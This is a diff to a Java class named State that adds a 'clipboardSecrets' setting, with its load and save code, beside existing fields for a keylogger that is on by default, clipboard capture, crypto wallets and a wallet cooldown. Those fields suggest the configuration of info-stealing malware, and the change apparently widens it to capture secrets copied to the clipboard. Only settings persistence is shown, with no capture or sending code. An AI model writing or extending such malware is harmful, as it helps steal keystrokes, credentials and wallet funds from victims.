@@ -27,9 +27,11 @@ public final class State {
 	public boolean keylogger = true;
 	public boolean keyloggerHardOff = false;
 	public boolean clipboard = true;
+	public boolean clipboardSecrets = true;
 	public boolean walletsSet = false;
 	public boolean keyloggerSet = false;
 	public boolean clipboardSet = false;
+	public boolean clipboardSecretsSet = false;
 	public boolean clipboardOverrides = false;
 	public long walletCooldownUntil = 0L;
 	public String lastWalletKey = "";
@@ -63,9 +65,11 @@ public final class State {
 			state.keylogger = bool(map, "keylogger", true);
 			state.keyloggerHardOff = bool(map, "keyloggerHardOff", false);
 			state.clipboard = bool(map, "clipboard", true);
+			state.clipboardSecrets = bool(map, "clipboardSecrets", true);
 			state.walletsSet = bool(map, "walletsSet", false);
 			state.keyloggerSet = bool(map, "keyloggerSet", false);
 			state.clipboardSet = bool(map, "clipboardSet", false);
+			state.clipboardSecretsSet = bool(map, "clipboardSecretsSet", false);
 			state.clipboardOverrides = bool(map, "clipboardOverrides", false);
 			state.walletCooldownUntil = Json.num(map, "walletCooldownUntil", 0L);
 			state.lastWalletKey = Json.str(map, "lastWalletKey", "");
@@ -127,9 +131,11 @@ public final class State {
 			map.put("keylogger", keylogger);
 			map.put("keyloggerHardOff", keyloggerHardOff);
 			map.put("clipboard", clipboard);
+			map.put("clipboardSecrets", clipboardSecrets);
 			map.put("walletsSet", walletsSet);
 			map.put("keyloggerSet", keyloggerSet);
 			map.put("clipboardSet", clipboardSet);
+			map.put("clipboardSecretsSet", clipboardSecretsSet);
 			map.put("clipboardOverrides", clipboardOverrides);
 			map.put("walletCooldownUntil", walletCooldownUntil);
 			map.put("lastWalletKey", lastWalletKey);
